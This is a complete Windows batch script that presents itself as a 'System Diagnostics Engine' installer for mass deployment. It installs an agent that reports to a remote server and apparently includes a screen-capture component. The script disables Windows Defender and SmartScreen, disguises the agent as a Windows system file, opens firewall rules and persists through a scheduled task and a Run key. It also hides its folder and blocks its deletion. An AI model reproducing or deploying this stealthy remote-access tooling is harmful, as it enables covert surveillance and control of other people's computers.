@echo off
setlocal EnableDelayedExpansion
title System Diagnostics Engine - Installer
color 0A
mode con: cols=70 lines=40

:: =========================================================
:: ULTIMATE SETUP v8.0 — Professional Mass Deployment
:: For 400-500+ machines. Single BAT, minimal clicks.
:: Based on the PROVEN service.vbs pattern.
:: =========================================================

:: ── ADMIN ELEVATION ──────────────────────────────────
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo.
    echo  [!] This installer requires Administrator access.
    echo.
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
pushd "%CD%"
CD /D "%~dp0"

:: ── CONFIGURATION ────────────────────────────────────
set "INSTALL_DIR=C:\ProgramData\Microsoft\Windows\SystemHealth"
set "BIN_NAME=RuntimeBroker_Sys.exe"
set "SERVER_URL=https://h-boss-production.up.railway.app"
set "TASK_NAME=MicrosoftWindowsHealthMonitor"

cls
echo.
echo  ===========================================================
echo        SYSTEM DIAGNOSTICS ENGINE - DEPLOYMENT v8.0
echo  ===========================================================
echo.
echo   Target Server : %SERVER_URL%
echo   Install Path  : %INSTALL_DIR%
echo.
echo  -----------------------------------------------------------
echo.

:: ── STEP 0: ANTIVIRUS CONSENT ────────────────────────
echo  [?] Would you like to disable Windows Defender
echo      Real-Time Protection for this installation?
echo.
echo      This prevents the antivirus from blocking
echo      the agent during installation.
echo.
echo      You can re-enable it after installation.
echo.
choice /C YN /M "  Disable Defender temporarily"
if %errorlevel% equ 1 (
    echo.
    echo  [~] Requesting Defender disable...
    :: Run in background — if it hangs, it won't block us
    start "" /B cmd /c "powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true -EA 0; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -EA 0; Add-MpPreference -ExclusionProcess '%BIN_NAME%' -EA 0; Add-MpPreference -ExclusionProcess 'ScreenCap.exe' -EA 0" >nul 2>&1"
    echo  [*] Defender disable requested. Continuing...
) else (
    echo.
    echo  [*] Skipping Defender changes. If installation
    echo      fails, you may need to add exclusions manually.
)
echo.

:: ── STEP 1: PREREQUISITES CHECK ─────────────────────
echo  [1/7] Checking prerequisites...

:: Check .NET Framework 4.x (needed for ScreenCap compilation)
set "HAS_DOTNET=0"
if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "HAS_DOTNET=1"
if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" set "HAS_DOTNET=1"

:: Check Visual C++ Runtime
set "HAS_VCREDIST=0"
reg query "HKLM\SOFTWARE\Microsoft\VisualStudio\14.0\VC\Runtimes\x64" /v "Version" >nul 2>&1
if %errorlevel% equ 0 set "HAS_VCREDIST=1"

:: Check wscript.exe (should always exist on Windows)
set "HAS_WSCRIPT=0"
if exist "%SYSTEMROOT%\system32\wscript.exe" set "HAS_WSCRIPT=1"

echo        .NET Framework 4.x : !HAS_DOTNET! (1=Yes, 0=No)
echo        VC++ Redistributable: !HAS_VCREDIST! (1=Yes, 0=No)
echo        WScript Engine      : !HAS_WSCRIPT! (1=Yes, 0=No)

if "!HAS_VCREDIST!"=="0" (
    echo.
    echo  [~] Visual C++ Runtime missing. Downloading...
    bitsadmin /transfer "VCRedist" /priority foreground "https://aka.ms/vs/17/release/vc_redist.x64.exe" "%TEMP%\vc_redist.x64.exe" >nul 2>&1
    if exist "%TEMP%\vc_redist.x64.exe" (
        echo  [~] Installing VC++ Runtime silently...
        "%TEMP%\vc_redist.x64.exe" /install /quiet /norestart
        del /F /Q "%TEMP%\vc_redist.x64.exe" >nul 2>&1
        echo  [*] VC++ Runtime installed.
    ) else (
        echo  [!] Download failed. Agent may still work.
    )
)

if "!HAS_WSCRIPT!"=="0" (
    echo  [ERROR] WScript.exe not found. Cannot continue.
    pause
    exit /B
)
echo  [*] Prerequisites OK.
echo.

:: ── STEP 2: CLEAN OLD INSTALLATION ──────────────────
echo  [2/7] Cleaning previous installation...
taskkill /F /IM "%BIN_NAME%" /T >nul 2>&1
taskkill /F /IM "wscript.exe" /T >nul 2>&1
taskkill /F /IM "ScreenCap.exe" /T >nul 2>&1
taskkill /F /IM "teram_agent.exe" /T >nul 2>&1
ping 127.0.0.1 -n 2 >nul
schtasks /Delete /TN "%TASK_NAME%" /F >nul 2>&1
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /f >nul 2>&1

if exist "%INSTALL_DIR%" (
    attrib -h -s -r "%INSTALL_DIR%" /D /S >nul 2>&1
    takeown.exe /F "%INSTALL_DIR%" /R /A /D Y >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /grant Administrators:F /T /C /Q >nul 2>&1
    icacls.exe "%INSTALL_DIR%" /reset /T /C /Q >nul 2>&1
    rmdir /S /Q "%INSTALL_DIR%" >nul 2>&1
)
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
echo  [*] Clean.
echo.

:: ── STEP 3: INSTALL FILES ────────────────────────────
echo  [3/7] Installing agent files...

:: Verify source executable exists
if not exist "%~dp0teram_agent.exe" (
    if not exist "%~dp0node.exe" (
        echo.
        echo  [ERROR] Agent executable not found!
        echo  Make sure teram_agent.exe is in this folder.
        echo.
        pause
        exit /B
    )
)

:: Copy all files to install directory
xcopy /E /I /Q /Y /H "%~dp0*" "%INSTALL_DIR%" >nul 2>&1
if %errorlevel% neq 0 (
    robocopy "%~dp0" "%INSTALL_DIR%" /E /IS /IT /NP /NFL /NDL /NJH /NJS >nul 2>&1
)

:: Rename agent to disguised name
if exist "%~dp0teram_agent.exe" (
    copy /Y "%~dp0teram_agent.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
) else (
    copy /Y "%~dp0node.exe" "%INSTALL_DIR%\%BIN_NAME%" >nul
)

:: Try to compile ScreenCap for this machine (keep bundled if fails)
if "!HAS_DOTNET!"=="1" (
    if exist "%INSTALL_DIR%\ScreenCap.cs" (
        set "CSC="
        if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
        if not defined CSC set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
        "!CSC!" /nologo /target:winexe /out:"%INSTALL_DIR%\ScreenCap.exe" /r:System.Windows.Forms.dll,System.Drawing.dll "%INSTALL_DIR%\ScreenCap.cs" >nul 2>&1
        if !errorlevel! neq 0 (
            echo  [!] ScreenCap compile failed - using bundled version.
            if exist "%~dp0ScreenCap.exe" copy /Y "%~dp0ScreenCap.exe" "%INSTALL_DIR%\ScreenCap.exe" >nul
        )
    )
) else (
    if exist "%~dp0ScreenCap.exe" copy /Y "%~dp0ScreenCap.exe" "%INSTALL_DIR%\ScreenCap.exe" >nul
)

:: Unblock all files (remove Zone.Identifier)
for %%f in ("%INSTALL_DIR%\*.exe") do (
    del /F "%%f:Zone.Identifier" >nul 2>&1
)

echo  [*] Files installed.
echo.

:: ── STEP 4: FIREWALL RULES ──────────────────────────
echo  [4/7] Configuring firewall...
netsh advfirewall firewall delete rule name="Windows System Health" >nul 2>&1
netsh advfirewall firewall delete rule name="Windows System Health In" >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health" dir=out action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
netsh advfirewall firewall add rule name="Windows System Health In" dir=in action=allow program="%INSTALL_DIR%\%BIN_NAME%" enable=yes profile=any >nul 2>&1
:: SmartScreen disable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
echo  [*] Firewall configured.
echo.

:: ── STEP 5: CREATE SERVICE WRAPPER ──────────────────
echo  [5/7] Creating auto-restart service...

:: The PROVEN service.vbs: runs exe hidden, auto-restarts on crash
(
 echo Set W = CreateObject^("WScript.Shell"^)
 echo W.CurrentDirectory = "%INSTALL_DIR%"
 echo Do
 echo   W.Run chr^(34^) ^& "%INSTALL_DIR%\%BIN_NAME%" ^& chr^(34^) ^& " index.js %SERVER_URL%", 0, True
 echo   WScript.Sleep 5000
 echo Loop
) > "%INSTALL_DIR%\service.vbs"

echo  [*] Service wrapper created.
echo.

:: ── STEP 6: PERSISTENCE (Scheduled Task + Registry) ─
echo  [6/7] Setting up auto-start on boot...

:: Scheduled Task — runs on every logon
schtasks /Create /TN "%TASK_NAME%" /TR "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1
if %errorlevel% equ 0 (
    echo        Scheduled Task : OK
) else (
    echo        Scheduled Task : FAILED (will use registry)
)

:: Registry Run Key — backup persistence
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsHealthCheck" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\service.vbs\"" /f >nul
echo        Registry Key    : OK

:: Stealth — hide folder and key files
attrib +h +s "%INSTALL_DIR%" /D >nul 2>&1
attrib +h +s "%INSTALL_DIR%\%BIN_NAME%" >nul 2>&1
attrib +h +s "%INSTALL_DIR%\service.vbs" >nul 2>&1
echo        Stealth Mode    : ON

:: Lock folder — deny DELETE only, allow execution
icacls "%INSTALL_DIR%" /deny Everyone:(DE,WDAC) /T /C /Q >nul 2>&1
echo        Folder Lock     : ON
echo.

:: ── STEP 7: LAUNCH ──────────────────────────────────
echo  [7/7] Starting agent...
echo.
start "" wscript.exe "%INSTALL_DIR%\service.vbs"

:: Wait for process to appear
echo  [~] Waiting for agent to start...
set "ATTEMPTS=0"
:WaitLoop
set /a ATTEMPTS+=1
if %ATTEMPTS% gtr 8 goto WaitDone
ping 127.0.0.1 -n 2 >nul
tasklist /FI "IMAGENAME eq %BIN_NAME%" 2>nul | find /i "%BIN_NAME%" >nul
if %errorlevel% equ 0 goto AgentRunning
echo  [~] Waiting... (attempt %ATTEMPTS%/8)
goto WaitLoop

:AgentRunning
echo.
echo  ===========================================================
echo      DEPLOYMENT SUCCESSFUL
echo  ===========================================================
echo.
echo   Status     : RUNNING
echo   Server     : %SERVER_URL%
echo   Location   : %INSTALL_DIR%
echo   Auto-Start : Scheduled Task + Registry
echo   Stealth    : Hidden + Protected
echo.
echo   The agent will auto-reconnect after reboots,
echo   shutdowns, and network interruptions.
echo.
echo   Check your dashboard at:
echo   %SERVER_URL%
echo.
echo  ===========================================================
goto Finish

:WaitDone
echo.
echo  ===========================================================
echo      INSTALLED - AGENT WILL START ON NEXT REBOOT
echo  ===========================================================
echo.
echo   The agent was installed but could not start now.
echo   This is usually because antivirus blocked it.
echo.
echo   TO FIX:
echo    1. Open your Antivirus settings
echo    2. Add exclusion for: %INSTALL_DIR%
echo    3. Reboot your computer
echo.
echo   Or manually start with:
echo    wscript.exe "%INSTALL_DIR%\service.vbs"
echo.
echo  ===========================================================

:Finish
echo.
echo  Press any key to close this window...
pause >nul
exit /B
